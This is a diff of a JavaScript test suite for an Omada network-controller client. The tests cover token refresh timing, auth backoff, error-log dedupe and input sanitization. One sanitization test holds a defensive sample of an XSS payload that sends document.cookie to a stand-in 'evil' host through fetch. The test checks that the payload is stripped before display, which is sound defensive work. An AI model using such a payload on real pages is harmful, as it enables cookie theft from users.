@@ -95,6 +95,9 @@ function buildOmadaClient() {
     sanitizeBaseUrl:    async (u) => u,
     sanitizePathSegment: (s) => s,
     db: { query: async (sql, params) => { calls.dbUpdates.push({ sql, params }); return [[]]; } },
+    // Declared later in server.js than the lifted block, so provide it here. The real
+    // wiring is pinned by source assertions in the review-4 test.
+    _deviceVariantById: {},
     AbortSignal: { timeout: () => undefined },
     Date, Error, String, Array, Math, JSON, console,
   };
@@ -106,6 +109,8 @@ function buildOmadaClient() {
               omadaInvalidateToken, isOmadaPlaneError, OmadaPlaneError,
               omadaCheckFailure, omadaNoteControllerUnreadable,
               omadaNoteControllerReadable, omadaForgetController,
+              omadaNoteAuthFailure, omadaClearAuthBackoff, omadaAuthBackoffActive,
+              omadaSanitizeControllerText,
               OMADA_EXPIRED_TOKEN_RE, omadaTokens };`
   );
 
@@ -224,15 +229,39 @@ test("proactive refresh: the token is renewed at 75% of its lifetime, not at the
   assert.ok(lifeMs > 0); // sanity: the arithmetic above is meaningful
 });
 
-test("proactive refresh keeps a minimum 60s margin even for a very short token", async () => {
+test("a short-lived token still gets a usable cache window (review-7)", async () => {
+  // The first implementation subtracted a flat 60s, so for expiresIn <= 60 the refresh
+  // point landed at `now` and the cache was defeated entirely: EVERY call re-authenticated,
+  // doubling request volume and meaning the "cached token" the retry is meant to replace
+  // was never cached at all. The margin is now floored at half the lifetime.
+  for (const expiresIn of [120, 80, 60, 30, 10, 1]) {
+    const { api, calls, queue } = buildOmadaClient();
+    queue.auth.push(authOk("SHORT", expiresIn));
+    await api.omadaGetToken(CTRL);
+    const e = api.omadaTokens[CTRL.id];
+    const window = e.refreshAt - (e.expiresAt - expiresIn * 1000);
+
+    assert.ok(window > 0,
+      `expiresIn=${expiresIn}s must leave a non-zero cache window, got ${window}ms`);
+    assert.ok(window <= expiresIn * 1000 * 0.75 + 5,
+      `expiresIn=${expiresIn}s must still refresh ahead of expiry (window ${window}ms)`);
+
+    // And the window must actually be usable: a second call reuses the token.
+    queue.get.push({ body: { errorCode: 0, result: 1 } });
+    await api.omadaApiGet(CTRL, "/x");
+    assert.equal(calls.auth, 1,
+      `expiresIn=${expiresIn}s: a cached token must be reused, not re-fetched`);
+  }
+});
+
+test("a 2h production token keeps the 75% refresh point (review-7 did not regress it)", async () => {
   const { api, queue } = buildOmadaClient();
-  queue.auth.push(authOk("SHORT", 70));           // 70s lifetime
+  queue.auth.push(authOk("PROD", 7200));
   await api.omadaGetToken(CTRL);
   const e = api.omadaTokens[CTRL.id];
-  assert.ok(e.expiresAt - e.refreshAt >= 60_000 - 5,
-    "the 60s floor must win over the 75% ratio for a short-lived token");
-  assert.ok(e.refreshAt >= Date.now() - 5,
-    "refreshAt must not land in the past, which would re-auth on every single call");
+  const margin = e.expiresAt - e.refreshAt;
+  assert.ok(Math.abs(margin - 0.25 * 7200_000) < 2000,
+    `Omada issues 7200s tokens; the refresh must stay at 75% (~30min margin), got ${Math.round(margin/60000)}min`);
 });
 
 test("force=true bypasses a cached token our own clock still thinks is valid", async () => {
@@ -595,8 +624,21 @@ test("review-4: deleting a controller drops its cached unreadable state", () => 
   assert.equal(calls.logs.filter(l => l.check === "CONTROLLER").length, 1,
     "after forgetting, a new failure must log as a first failure, not increment a stale entry");
 
-  assert.match(serverSource, /omadaForgetController\(id\);/,
-    "the controller DELETE handler must prune the unreadable-state entry");
+  // The caches cleared live in different scopes, and the key types differ -- deleting
+  // with the wrong type silently no-ops, so pin each one.
+  const fn = namedFunction("omadaForgetController");
+  assert.match(fn, /delete _omadaUnreadable\[String\(controllerId\)\]/,
+    "_omadaUnreadable is keyed by String()");
+  assert.match(fn, /delete _omadaAuthBackoff\[String\(controllerId\)\]/,
+    "_omadaAuthBackoff is keyed by String()");
+  assert.match(fn, /delete _deviceVariantById\[controllerId\]/,
+    "_deviceVariantById is keyed by the raw id");
+  assert.match(fn, /delete omadaTokens\[controllerId\]/,
+    "the token cache is keyed by the raw id");
+
+  const deletes = serverSource.match(/omadaForgetController\(id\)/g) || [];
+  assert.ok(deletes.length >= 2,
+    `both the DELETE and the PUT handler must clear per-controller state, found ${deletes.length}`);
 });
 
 test("review-5: the LTE probe loop stops at the first plane fault", () => {
@@ -607,4 +649,123 @@ test("review-5: the LTE probe loop stops at the first plane fault", () => {
   // The per-path failure must still be swallowed — that is what the probes are for.
   assert.match(fn, /LTE probe \$\{path\}: \$\{e\.message\}/,
     "an ordinary per-path probe failure must still be logged and tolerated");
+});
+
+// -- 7. Second review round (full untruncated reports) ----------------------
+//
+// The first pass at the review only addressed part of what the three reviewers
+// reported. These cover the rest: the per-check log line, the public API contract,
+// the last_error write, credential-replay amplification, and ingress hygiene.
+
+test("review-4b: the per-check log line does not paint an indeterminate check red", () => {
+  const loop = sourceBetween("checks.forEach(c => {", "const inMaintenance");
+  assert.match(loop, /const lvl = c\.indeterminate \? "warn" : \(c\.ok \? "info" : "error"\)/,
+    "logging an indeterminate check at level:error against the monitor reinstates the " +
+    "per-monitor-per-poll fan-out that the single controller warning replaces");
+  assert.match(loop, /indeterminate:!!c\.indeterminate/,
+    "the log entry must carry the flag so a consumer can tell the two apart");
+  assert.doesNotMatch(loop, /level:c\.ok\?"info":"error", server:def\.name/,
+    "the old binary level must be gone");
+});
+
+test("review-5: the public v1 API exposes `indeterminate` so ok:null is interpretable", () => {
+  // ok:null is falsy, so any external client doing `if (!check.ok)` counts it as a
+  // failure. This is a versioned public contract, so the flag has to be there.
+  const projections = serverSource.match(
+    /ok:c\.ok, indeterminate:!!c\.indeterminate, detail:c\.detail\|\|null/g
+  ) || [];
+  assert.ok(projections.length >= 2,
+    `both /api/v1 check projections must expose indeterminate, found ${projections.length}`);
+  assert.doesNotMatch(serverSource, /map\(c => \(\{ type:c\.type, ok:c\.ok, detail:c\.detail\|\|null/,
+    "no v1 projection may emit ok:null without the flag");
+});
+
+test("review-6: the last_error write is deduped and cannot clobber a newer admin value", () => {
+  const fn = namedFunction("omadaNoteControllerUnreadable");
+  assert.match(fn, /if \(wroteNew && typeof db !== "undefined"/,
+    "the write must sit behind the same dedupe guard as the logging; previously it ran " +
+    "on EVERY failure, up to 24 times per poll through the LTE probe loop");
+  assert.match(fn, /WHERE id=\? AND \(last_error IS NULL OR last_error <> \?\)/,
+    "the admin UI writes this column on save/test, so the poller must not overwrite " +
+    "an identical or newer value unconditionally");
+});
+
+test("review-6b: one unreadable window writes last_error once, not once per check", () => {
+  const { api, calls } = buildOmadaClient();
+  const err = () => new api.OmadaPlaneError(TOKEN_EXPIRED_MSG, "auth");
+  // 14 checks across one controller, as in production.
+  for (let i = 0; i < 14; i++) api.omadaCheckFailure("omada_device", err(), 7);
+
+  const writes = calls.dbUpdates.filter(u => /SET last_error=\?/.test(u.sql));
+  assert.equal(writes.length, 1,
+    `14 failing checks on one controller must produce ONE last_error write, got ${writes.length}`);
+});
+
+test("review-3/4 (security): credential replay is bounded by an auth backoff", () => {
+  const fn = namedFunction("omadaGetToken");
+  assert.match(fn, /const backoff = omadaAuthBackoffActive\(controller\.id\)/,
+    "the retry is bounded per call, but omadaLteCheck's 9 probes x omadaListDevices' 3 " +
+    "variants each carry their own re-auth: ~26 client_credentials POSTs per poll");
+  assert.match(fn, /omadaClearAuthBackoff\(controller\.id\)/,
+    "a successful authentication must clear the backoff");
+  const backoffFn = namedFunction("omadaNoteAuthFailure");
+  assert.match(backoffFn, /Math\.min\(OMADA_AUTH_BACKOFF_MAX_MS/,
+    "the backoff must be capped so it cannot grow without bound");
+});
+
+test("review-3/4b: a controller rejecting every auth gets one POST, not one per probe", async () => {
+  const { api, calls, queue } = buildOmadaClient();
+  // Authentication itself is rejected, as during a credential problem.
+  for (let i = 0; i < 14; i++) {
+    queue.auth.push({ body: { errorCode: -44112, msg: "Invalid client credentials" } });
+  }
+  for (let i = 0; i < 12; i++) {
+    try { await api.omadaApiGet(CTRL, "/sites/s1/devices"); } catch (e) { /* expected */ }
+  }
+  assert.equal(calls.auth, 1,
+    `12 rejected calls (3 MSP variants + 9 LTE probes) must replay the client_secret ` +
+    `ONCE while the backoff holds, got ${calls.auth}`);
+});
+
+test("review-3/4c: a valid cached token still works while a backoff is active", async () => {
+  // The backoff must suppress only NEW authentications, never a usable cached token.
+  const { api, calls, queue } = buildOmadaClient();
+  queue.auth.push(authOk("GOOD", 7200));
+  queue.get.push({ body: { errorCode: 0, result: 1 } });
+  await api.omadaApiGet(CTRL, "/a");
+  assert.equal(calls.auth, 1);
+
+  api.omadaNoteAuthFailure(CTRL.id, "simulated");     // backoff now active
+  queue.get.push({ body: { errorCode: 0, result: 2 } });
+  assert.equal(await api.omadaApiGet(CTRL, "/b"), 2,
+    "a still-valid cached token must keep serving reads during a backoff");
+  assert.equal(calls.auth, 1, "and must not trigger a new authentication");
+});
+
+test("security: controller-supplied text is sanitized and bounded at ingress", () => {
+  const { api, calls } = buildOmadaClient();
+  const hostile = '<img src=x onerror="fetch(\'https://evil/?c=\'+document.cookie)">'
+                + "\u0000\u001b[31m" + "A".repeat(500);
+  api.omadaCheckFailure("omada_device", new api.OmadaPlaneError(hostile, "auth"), 7);
+
+  const warn = calls.logs.find(l => l.check === "CONTROLLER");
+  assert.ok(warn, "the controller warning must still be emitted");
+  assert.doesNotMatch(warn.message, /[<>]/,
+    "angle brackets must be stripped: this text reaches an innerHTML log viewer (T-0739) " +
+    "and outbound alert payloads");
+  assert.doesNotMatch(warn.message, /[\x00-\x1f\x7f]/,
+    "control characters must be stripped");
+
+  const write = calls.dbUpdates.find(u => /SET last_error=\?/.test(u.sql));
+  assert.ok(write, "last_error must still be written");
+  assert.ok(write.params[0].length <= 300,
+    `last_error must be bounded (TEXT column, hostile controller): got ${write.params[0].length}`);
+});
+
+test("security: sanitizing does not mangle a legitimate controller message", () => {
+  const { api, calls } = buildOmadaClient();
+  api.omadaCheckFailure("omada_device", new api.OmadaPlaneError(TOKEN_EXPIRED_MSG, "auth"), 7);
+  const warn = calls.logs.find(l => l.check === "CONTROLLER");
+  assert.match(warn.message, /The access token has expired/,
+    "the real Omada message must survive sanitization intact, or diagnosis gets harder");
 });
